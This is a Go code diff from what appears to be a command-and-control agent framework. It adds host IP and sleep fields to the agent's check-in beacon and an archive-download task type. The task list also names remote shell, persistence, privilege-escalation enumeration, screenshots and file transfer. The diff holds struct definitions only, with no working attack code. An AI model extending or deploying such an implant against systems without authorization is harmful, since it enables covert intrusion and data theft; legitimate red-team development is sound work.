@@ -9,13 +9,15 @@ import (
 
 // Beacon is sent from agent → server on every check-in.
 type Beacon struct {
-	AgentID    string      `json:"agent_id"`
-	Timestamp  int64       `json:"ts"`
-	Nonce      []byte      `json:"nonce"`
-	Hostname   string      `json:"hostname"`
-	OS         string      `json:"os"`
-	Arch       string      `json:"arch"`
-	TaskOutput *TaskResult `json:"output,omitempty"`
+	AgentID      string      `json:"agent_id"`
+	Timestamp    int64       `json:"ts"`
+	Nonce        []byte      `json:"nonce"`
+	Hostname     string      `json:"hostname"`
+	OS           string      `json:"os"`
+	Arch         string      `json:"arch"`
+	HostIP       string      `json:"host_ip,omitempty"`
+	SleepSeconds int         `json:"sleep_seconds,omitempty"`
+	TaskOutput   *TaskResult `json:"output,omitempty"`
 }
 
 // TaskResult carries the output of a completed task back to the server.
@@ -31,7 +33,7 @@ type TaskResult struct {
 // Task is sent from server → agent in the beacon response.
 type Task struct {
 	ID      string `json:"id"`
-	Type    string `json:"type"` // shell | upload | download | ps | screenshot | persistence | peas | snapshot | ls | cancel | complete | pathbrowse | sleep | kill | noop
+	Type    string `json:"type"` // shell | upload | download | download_archive | ps | screenshot | persistence | peas | snapshot | ls | cancel | complete | pathbrowse | sleep | kill | noop
 	Payload string `json:"payload"`
 }
 
